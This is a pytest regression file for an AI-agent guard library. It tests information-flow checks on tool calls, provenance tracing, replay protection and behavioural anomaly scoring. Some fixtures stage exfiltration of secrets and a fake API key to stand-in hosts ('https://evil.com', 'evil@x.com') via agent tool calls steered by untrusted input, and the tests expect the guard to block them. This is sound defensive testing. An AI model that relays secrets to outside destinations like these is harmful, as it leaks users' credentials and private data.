"""Regression ratchet for the E4/E5/E6 remediation fixes.

Each test here would have FAILED against the pre-remediation code, so the
specific defect cannot silently return:

  E5(a) guarded tools return the REAL value, not a Tainted wrapper.
  E5(b) the IFC gate actually consults `control_causes` for the (T) predicate.
  E5(c) backward_trace reaches the root untrusted origin on a >20-node chain.
  E5(d) to_aifg builds observed producer->consumer DATA lineage at runtime.
  E6    a signed message cannot be replayed within the freshness window.
  E4(c) stable tool encoding; estimated_recall is None (not 1.0) on no data;
        transition memory survives a save/load round-trip.
"""

from __future__ import annotations

import pytest

from lucin.guard.interceptor import GuardSession, guard_tool, GuardBlockError
from lucin.guard.ifc_runtime import (
    IFCPolicy, ToolCall, Tainted, guard_tool_call,
    UNTRUSTED_SECRET, UNTRUSTED_PUBLIC, TRUSTED_SECRET,
)
from lucin.guard.provenance import ProvenanceGraph
from lucin.aifg import EdgeKind, Integrity, Confidentiality, IFCLabel


# ---------------------------------------------------------------------------
# E5(a) — guarded tools return the real underlying value
# ---------------------------------------------------------------------------

def test_guarded_tool_returns_real_value_type():
    session = GuardSession(policy=IFCPolicy("t"))

    @guard_tool(session, label=UNTRUSTED_SECRET, tool_name="read_db")
    def read_db(q) -> str:
        return "row-data-1234"

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="count_rows")
    def count_rows(q) -> int:
        return 42

    s = read_db("x")
    n = count_rows("x")
    # Not a Tainted wrapper — the caller gets the plain, serializable value.
    assert isinstance(s, str) and s == "row-data-1234"
    assert isinstance(n, int) and n == 42
    assert not isinstance(s, Tainted)


# ---------------------------------------------------------------------------
# E5(b) — the (T) predicate consults control_causes
# ---------------------------------------------------------------------------

def test_ifc_gate_consults_control_causes():
    """A TRUSTED-integrity but SECRET value whose control path was steered by
    untrusted input (control_causes) must still trip (T) at an egress sink."""
    policy = IFCPolicy("t")
    # integrity=TRUSTED so the OLD label-only predicate would NOT fire (T);
    # but control_causes marks it as untrusted-steered, which now does.
    arg = Tainted(
        value="secret-report",
        label=TRUSTED_SECRET,
        control_causes=frozenset({"llm_relayed"}),
    )
    call = ToolCall(tool_name="send_email", destination="https://evil.com", args=[arg])
    decision = guard_tool_call(call, policy)
    assert not decision.allow, "control_causes must be load-bearing for (T)"
    assert any("llm_relayed" in w for w in decision.witness)


def test_ifc_gate_trusted_no_untrusted_cause_allows():
    """Control: a fully trusted value with no untrusted control cause is allowed
    even at an egress sink (guards against (T) over-firing)."""
    policy = IFCPolicy("t")
    arg = Tainted(value="ok", label=TRUSTED_SECRET, control_causes=frozenset())
    call = ToolCall(tool_name="send_email", destination="https://x.com", args=[arg])
    assert guard_tool_call(call, policy).allow


# ---------------------------------------------------------------------------
# E5(c) — backward_trace reaches the root on a long (>20 node) chain
# ---------------------------------------------------------------------------

def test_backward_trace_finds_root_on_long_chain():
    pg = ProvenanceGraph(agent_id="a", human_sponsor="alice")
    # Root: an untrusted origin entity (no producer -> it is an origin node).
    root = pg.record_entity("untrusted_web_content", integrity="untrusted",
                            confidentiality="public")
    # Build a long derivation chain of >20 hops off the root.
    prev = root
    for i in range(30):
        act = pg.record_activity(f"transform_{i}", inputs={}, triggered_by="llm",
                                 used_entities=[prev])
        prev = pg.record_entity(f"derived_{i}", produced_by=act,
                                derived_from=[prev], integrity="trusted",
                                confidentiality="internal")
    trace = pg.backward_trace(prev)
    # The old DFS-with-20-node cap would stop before the root; BFS-by-depth
    # reaches it.
    assert root in trace.nodes, "backward_trace must reach the root on a long chain"
    assert any(n.node_id == root for n in trace.untrusted_origins)


# ---------------------------------------------------------------------------
# E5(d) — runtime to_aifg builds observed DATA lineage edges
# ---------------------------------------------------------------------------

def test_runtime_to_aifg_builds_lineage_edge():
    session = GuardSession(policy=IFCPolicy("t"))

    @guard_tool(session, label=UNTRUSTED_SECRET, tool_name="read_secret")
    def read_secret(k):
        return "APIKEY=sk-live-abcd1234efgh5678 ssn=123-45-6789"

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="send_email")
    def send_email(to, body):
        return "sent"

    secret = read_secret("db")
    with pytest.raises(GuardBlockError):
        send_email("evil@x.com", secret)  # verbatim relay of the secret

    g = session.provenance.to_aifg()
    data_edges = {(e.src, e.dst) for e in g.edges if e.kind == EdgeKind.DATA}
    assert ("read_secret", "send_email") in data_edges


# ---------------------------------------------------------------------------
# E6 — signed-message replay is rejected within the freshness window
# ---------------------------------------------------------------------------

def test_identity_replay_rejected():
    from lucin.multiagent.identity import IdentityRegistry, sign_message

    registry = IdentityRegistry()
    alice = registry.register("alice", secret_key=b"a" * 32)
    registry.register("bob", secret_key=b"b" * 32)

    msg = sign_message(alice, "transfer $1000 to bob", recipient="bob")
    # First delivery: accepted.
    assert registry.verify(msg) is True
    # Replay of the SAME captured, still-fresh message: rejected (nonce spent).
    assert registry.verify(msg) is False
    # A fresh message with a new nonce is still accepted.
    msg2 = sign_message(alice, "transfer $1000 to bob", recipient="bob")
    assert registry.verify(msg2) is True


# ---------------------------------------------------------------------------
# E4(c) — stable encoding, honest recall, persisted transition memory
# ---------------------------------------------------------------------------

def test_stable_tool_encoding_is_process_independent():
    from lucin.behavioral.features import stable_tool_encoding
    # Deterministic and known (would differ per-process under builtin hash()).
    a = stable_tool_encoding("send_email")
    b = stable_tool_encoding("send_email")
    assert a == b
    assert 0 <= a < 10000
    assert stable_tool_encoding("read_db") != stable_tool_encoding("send_email")


def test_estimated_recall_is_none_without_ground_truth():
    from lucin.behavioral.calibration import CalibrationState, ScoreCalibrator
    import tempfile, os
    st = CalibrationState()
    assert st.estimated_recall is None  # not a fabricated 1.0
    with tempfile.TemporaryDirectory() as d:
        cal = ScoreCalibrator(storage_path=os.path.join(d, "c.json"))
        assert cal.get_metrics()["estimated_recall"] is None
        cal.add_feedback("a", "t", 80, "confirmed")
        assert cal.get_metrics()["estimated_recall"] == 1.0  # now defined


def test_transition_memory_survives_persistence_round_trip():
    from lucin.behavioral.scoring import BehavioralScorer
    from lucin.behavioral.persistence import BaselinePersistence
    from lucin.behavioral.features import AgentAction, extract_features
    from datetime import datetime, timedelta
    import tempfile

    scorer = BehavioralScorer()
    hist: list[AgentAction] = []
    base = datetime(2026, 1, 1, 12, 0, 0)
    for i in range(20):
        act = AgentAction(timestamp=base + timedelta(seconds=i), agent_id="agent-1",
                          session_id="s", action_type="tool_call",
                          tool_name="read_db" if i % 2 else "send_email")
        feats = extract_features(act, agent_history=list(hist))
        scorer.learn(feats)         # baseline stats (velocity, tool freq)
        scorer.score(feats)         # sequence memory (transition graph) is built here
        hist.append(act)

    b = scorer._baselines["agent-1"]
    assert b.transition_counts, "transitions must be learned"
    assert b.last_tools, "sequence memory must be populated"
    assert b.tool_frequencies, "tool frequencies must be learned"
    assert b.avg_actions_per_minute > 0.0, "baseline velocity must be learned (not dead 0.0)"

    with tempfile.TemporaryDirectory() as d:
        p = BaselinePersistence(storage_dir=d)
        p.save(scorer)
        restored = BehavioralScorer()
        BaselinePersistence(storage_dir=d).load(restored)
        rb = restored._baselines["agent-1"]
        # The transition graph and tool frequencies are NOT dropped on restart.
        assert rb.transition_counts == b.transition_counts
        assert rb.tool_frequencies == b.tool_frequencies
        assert rb.last_tools == b.last_tools
